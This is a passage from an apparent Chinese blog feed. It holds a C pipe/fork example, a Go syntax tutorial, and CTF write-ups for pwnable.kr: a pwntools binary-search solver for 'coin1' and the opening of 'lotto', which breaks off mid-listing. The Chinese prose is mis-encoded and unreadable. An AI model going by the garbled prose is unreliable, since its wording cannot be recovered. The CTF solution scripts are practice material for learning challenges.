class="string">&quot;Let&#x27;s study pipe!&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">pid_t</span> fpid;</span><br><span class="line">        pipe(fd);</span><br><span class="line">        fpid = fork();</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d \n&quot;, fd[0], fd[1]);</span></span><br><span class="line">        <span class="keyword">if</span>(fpid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//çˆ¶è¿›ç¨‹ å‘ç®¡é“ä¸­å†™å…¥æ•°æ®</span></span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">                write(fd[<span class="number">1</span>], buffer, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;father process input buffer in pipe success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//å­è¿›ç¨‹ ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ®</span></span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">                read(fd[<span class="number">0</span>], buffer2, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;son process output buffer in pipe success!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;the buffer in pipe is %s\n&quot;</span>, buffer2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç çš„ä½œç”¨ä½çˆ¶è¿›ç¨‹å°†bufferå­—ç¬¦ä¸²æ•°æ®å†™å…¥ç®¡é“ä¸­ï¼Œå­è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å…¥æ•°æ®åˆ°æ–°æ•°ç»„buffer2ä¸­</p><p>ç¼–è¯‘è¾“å‡ºå</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210124180113099.png" alt="image-20210124180113099"></p><h4 id="ç¼“å†²åŒº"><a href="#ç¼“å†²åŒº" class="headerlink" title="ç¼“å†²åŒº"></a>ç¼“å†²åŒº</h4><p>ä¸‰ç§ç¼“å†²</p><p>å…¨ç¼“å†²ï¼Œè¡Œç¼“å†²ï¼Œä¸ç¼“å†²</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;readå‡½æ•°&quot;&gt;&lt;a href=&quot;#readå‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;readå‡½æ•°&quot;&gt;&lt;/a&gt;readå‡½æ•°&lt;/h4&gt;&lt;p&gt;ä»æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£è¯»å…¥æŒ‡å®šå­—èŠ‚çš„å­—ç¬¦ä¸²åˆ°æŒ‡å®šçš„æ•°ç»„ä¸­&lt;/p&gt;
&lt;h4 id=&quot;writeå‡½æ•°&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>goè¯­è¨€å­¦ä¹ 1ï¼ˆå˜é‡ç±»å‹ä¸å£°æ˜æ–¹å¼ï¼Œå¾ªç¯ï¼‰</title>
    <link href="http://example.com/2021/01/30/go/GoStudy-1/"/>
    <id>http://example.com/2021/01/30/go/GoStudy-1/</id>
    <published>2021-01-30T14:51:32.538Z</published>
    <updated>2021-02-05T06:27:45.364Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><p>xxxä»£è¡¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</p><ol><li><p>åªè¿è¡Œä¸ç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run xxx</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build xxx</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆå·¥ç¨‹é¡¹ç›®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install</span><br></pre></td></tr></table></figure><h3 id="å°çŸ¥è¯†ç‚¹"><a href="#å°çŸ¥è¯†ç‚¹" class="headerlink" title="å°çŸ¥è¯†ç‚¹"></a>å°çŸ¥è¯†ç‚¹</h3></li><li><p>goè¯­è¨€ä¸­æ¯ä¸€ä¸ªå·¥ç¨‹é¡¹ç›®éƒ½éœ€è¦æœ‰ä¸€ä¸ªmainåŒ…ï¼Œè¿™ä¸ªåŒ…ä¸­çš„mainå‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br></pre></td></tr></table></figure></li><li><p>goè¯­è¨€ä¸­å‡½æ•°çš„èŠ±æ‹¬å·çš„å‰æ‹¬å·ä¸èƒ½å•ç‹¬ä¸€è¡Œ</p><p>âœ”</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>âŒ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> </span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>goè¯­è¨€ä¸­å£°æ˜çš„å˜é‡å¿…é¡»ä½¿ç”¨ï¼Œå¦åˆ™æŠ¥é”™</p></li></ol><p><a href="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">GOPATH,GOROOTçš„å…³ç³»</a></p><h3 id="å˜é‡ï¼ˆå¸¸é‡ï¼‰çš„å£°æ˜å’Œèµ‹å€¼"><a href="#å˜é‡ï¼ˆå¸¸é‡ï¼‰çš„å£°æ˜å’Œèµ‹å€¼" class="headerlink" title="å˜é‡ï¼ˆå¸¸é‡ï¼‰çš„å£°æ˜å’Œèµ‹å€¼"></a>å˜é‡ï¼ˆå¸¸é‡ï¼‰çš„å£°æ˜å’Œèµ‹å€¼</h3><ol><li>æ ‡å‡†å£°æ˜ï¼ˆå…ˆå£°æ˜åœ¨èµ‹å€¼ï¼‰<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> variable_name <span class="keyword">int</span> <span class="comment">//variable_type</span></span><br><span class="line">variable_name = <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li>ç®€åŒ–å£°æ˜ï¼Œè‡ªåŠ¨æ¨å¯¼ç±»å‹<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable_name := <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li>å¤šé‡å£°æ˜<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç›¸åŒç±»å‹</span></span><br><span class="line"><span class="keyword">var</span> a, b, c <span class="keyword">int</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸åŒç±»å‹å…ˆå£°æ˜åèµ‹å€¼ </span></span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">    b <span class="keyword">float32</span></span><br><span class="line">)</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å£°æ˜æ—¶èµ‹å€¼</span></span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">    a <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line">    b <span class="keyword">float32</span> = <span class="number">1.1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç®€åŒ–å†™æ³•</span></span><br><span class="line"><span class="keyword">var</span> a, b = <span class="number">1</span>, <span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è‡ªåŠ¨æ¨å¯¼ç±»å‹</span></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="number">1.1</span>, <span class="string">&quot;Tom&quot;</span></span><br></pre></td></tr></table></figure><h3 id="åŒ¿åå˜é‡"><a href="#åŒ¿åå˜é‡" class="headerlink" title="åŒ¿åå˜é‡"></a>åŒ¿åå˜é‡</h3>goè¯­è¨€ä¸­å­˜åœ¨åŒ¿åå˜é‡ï¼Œç”¨ä¸‹åˆ’çº¿è¡¨ç¤ºï¼Œå¤šç”¨äºæ¥å—å‡½æ•°è¿”å›å€¼æ—¶ä½¿ç”¨ï¼Œä¾‹å­<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">anon_var</span><span class="params">()</span> <span class="params">(a, b, c <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">a, _, c := anon_var()</span><br><span class="line">fmt.Println(a, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>ä¸Šé¢ä»£ç anon_varå‡½æ•°è¿”å›ä¸‰ä¸ªå€¼ï¼Œä½†æ˜¯æˆ‘åªæƒ³æ¥æ”¶ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªï¼Œå°±æ˜¯ç”¨åŒ¿åå˜é‡æ¥å¿½ç•¥ç¬¬äºŒä¸ªè¿”å›å€¼</li></ol><h3 id="iotaæšä¸¾"><a href="#iotaæšä¸¾" class="headerlink" title="iotaæšä¸¾"></a>iotaæšä¸¾</h3><p>iotaæ˜¯goè¯­è¨€ä¸­çš„å¸¸é‡è®¡æ•°å™¨ï¼Œåªèƒ½ä½œç”¨äºå¸¸é‡constï¼Œä¾‹å­å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a1 = <span class="literal">iota</span></span><br><span class="line">a2 = <span class="literal">iota</span></span><br><span class="line">a3 = <span class="literal">iota</span></span><br><span class="line">    )</span><br><span class="line">fmt.Println(a1, a2, a3)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130232401963.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç®€åŒ–å†™æ³•</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a1 = <span class="literal">iota</span></span><br><span class="line">a2 </span><br><span class="line">a3 </span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h3 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h3><p>goè¯­è¨€ä¸­å¾ªç¯åªæœ‰ä¸€ç§æ–¹å¼ï¼Œfor(rangeç®—è¿­ä»£çš„è¯)ï¼Œä¸‹é¢è´´ä½¿ç”¨æ–¹æ³•</p><ol><li><p>ä¸åŠ ä»»ä½•æ¡ä»¶ï¼šæ— çº¿å¾ªç¯ï¼Œé™¤éä½¿ç”¨breakè·³å‡ºå¾ªç¯</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;fish&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ™®é€šä½¿ç”¨æ–¹æ³•ï¼šä¸cè¯­è¨€æ ¼å¼ç±»ä¼¼</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> ä¸whileå¾ªç¯æ ¼å¼ç±»ä¼¼çš„å†™æ³•</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        sum := <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> ; sum &lt;= <span class="number">10</span>; &#123;</span><br><span class="line">                sum += sum</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(sum)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿™æ ·å†™ä¹Ÿå¯ä»¥ï¼Œæ›´åƒ While è¯­å¥å½¢å¼</span></span><br><span class="line">        <span class="keyword">for</span> sum &lt;= <span class="number">10</span>&#123;</span><br><span class="line">                sum += sum</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>ä¸rangeä¸€èµ·ä½¿ç”¨</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//iä»£è¡¨ä¸‹è¡¨ï¼Œdataä»£è¡¨æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;Hello Go&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, data := <span class="keyword">range</span> str &#123;</span><br><span class="line">fmt.Println(i, data)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;å‘½ä»¤&quot;&gt;&lt;a href=&quot;#å‘½ä»¤&quot; class=&quot;headerlink&quot; title=&quot;å‘½ä»¤&quot;&gt;&lt;/a&gt;å‘½ä»¤&lt;/h3&gt;&lt;p&gt;xxxä»£è¡¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;åªè¿è¡Œä¸ç¼–è¯‘&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="go" scheme="http://example.com/categories/go/"/>
    
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr coin1</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-coin1/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-coin1/</id>
    <published>2021-01-30T14:34:13.394Z</published>
    <updated>2021-02-08T05:12:41.937Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223550632.png"></p><p>ncè¿ä¸Šå»çœ‹çœ‹</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223653659.png"></p><p>ä¸€ä¸ªæ‰¾å‡ç¡¬å¸æ¸¸æˆï¼Œå¤§æ¦‚æ„æ€ä¸ºï¼š</p><p>Næ˜¯ç¡¬å¸ä¸ªæ•°ï¼ŒCæ˜¯è¾“å…¥æ¬¡æ•°ï¼Œè¾“å…¥ç›¸åº”çš„ç¡¬å¸ä¸‹æ ‡ä¼šç»™ä½ ç¡¬å¸çš„é‡é‡ï¼ˆå›¾ä¸­è¾“å…¥0ä»£è¡¨ç¬¬ä¸€ä¸ªç¡¬å¸ï¼Œ10æ˜¯ä¸€ä¸ªçœŸç¡¬å¸çš„é‡é‡ï¼Œè¾“å…¥0,1è¿”å›20ï¼Œä»£è¡¨ä¸¤ä¸ªçœŸç¡¬å¸çš„é‡é‡ï¼‰</p><p>å½“æ¬¡æ•°ç”¨å®Œæ—¶ï¼Œéœ€è¦è¾“å…¥å‡ç¡¬å¸å¯¹åº”çš„ä¸‹æ ‡ï¼Œ</p><p>æ•´ç†å®Œè¿‡åå°±æ˜¯ä¸€ä¸ªé¢˜ç›®è€ƒå¯Ÿæˆ‘ä»¬çš„äºŒåˆ†æŸ¥æ‰¾èƒ½åŠ›ï¼Œå°±æ˜¯å†™ä»£ç èƒ½åŠ›ï¼Œä½†æ˜¯è¿™ä¸ªä»£ç æˆ‘è°ƒè¯•äº†ä¸€ä¼šå„¿ã€‚ã€‚ï¼ˆå¤ªèœäº†ï¼‰ğŸ˜”</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>è„šæœ¬é‡Œé¢ç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼æ¥æå–å­—ç¬¦ä¸²ä¸­çš„æ•°å­—ï¼Œå‚è€ƒäº†è¿™ç¯‡æ–‡ç« ï¼ˆ<a href="https://www.codenong.com/10365225/">é“¾æ¥</a>ï¼‰</p><p>å› ä¸ºé“¾æ¥çš„ç«¯å£åªå¼€æ”¾ä¸€åˆ†é’Ÿï¼Œæˆ‘è¿™å„¿ç½‘é€Ÿæœ‰é™ï¼Œå°±åœ¨pwnable.krçš„æœåŠ¡å™¨ä¸Šå»è¿è¡Œä»£ç äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MakeFlat</span>(<span class="params">low, high</span>):</span></span><br><span class="line">    Flat = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(low, mid):</span><br><span class="line">        Flat += str(i) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="comment">#log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> Flat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinarySearch</span>(<span class="params">n, c</span>):</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = n</span><br><span class="line">    correct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(c):</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        flat = MakeFlat(low, high)</span><br><span class="line">        sh.sendline(flat)</span><br><span class="line">        p = sh.recv()</span><br><span class="line">        <span class="comment">#log.success(p)</span></span><br><span class="line">        <span class="keyword">if</span> int(p) == <span class="number">9</span>:</span><br><span class="line">            correct = flat</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> int(p) &lt; (mid - low) * <span class="number">10</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">elif</span> int(p) == (mid - low) * <span class="number">10</span>:</span><br><span class="line">            low = mid</span><br><span class="line">        correct = str(high - <span class="number">1</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;correct index: &#x27;</span> + correct)</span><br><span class="line">    sh.sendline(correct)</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">N_C</span>():</span></span><br><span class="line">    <span class="comment">#sleep(3)</span></span><br><span class="line">    Flat = sh.recv()</span><br><span class="line">    log.info(Flat)</span><br><span class="line">    ListOfNaC = map(int, re.findall(<span class="string">&#x27;\d+&#x27;</span>, Flat))</span><br><span class="line">    <span class="keyword">return</span> ListOfNaC</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\t- Ready? starting in 3 sec... -\n\t\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        _list = N_C()</span><br><span class="line">        BinarySearch(_list[<span class="number">0</span>], _list[<span class="number">1</span>])</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130224855930.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223550632.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ncè¿ä¸Šå»çœ‹çœ‹&lt;/p&gt;
&lt;p&gt;&lt;img s</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr lotto</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-lotto/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-lotto/</id>
    <published>2021-01-30T14:08:09.028Z</published>
    <updated>2021-02-08T05:13:07.401Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130221133246.png"></p><p>åˆ©ç”¨scpå‘½ä»¤ä»æœåŠ¡å™¨ä¸‹è½½æºç åˆ°æœ¬åœ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 -r lotto@pwnable.kr: &#x2F;home&#x2F;lotto&#x2F; &#x2F;home&#x2F;fish</span><br></pre></td></tr></table></figure><p>ç¨‹åºæºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 